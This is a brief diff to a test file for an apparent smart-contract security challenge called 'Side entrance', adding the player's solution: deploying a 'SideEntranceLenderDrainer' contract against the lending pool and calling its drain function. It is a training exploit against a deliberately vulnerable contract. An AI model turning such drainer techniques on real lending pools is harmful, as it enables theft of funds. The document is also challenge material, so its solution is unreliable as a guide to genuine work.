@@ -25,7 +25,8 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const sideEntranceLenderDrainerFactory = await (await ethers.getContractFactory('SideEntranceLenderDrainer', player)).deploy(pool.address);
+        await sideEntranceLenderDrainerFactory.drainSideEntranceLender();
     });
 
     after(async function () {
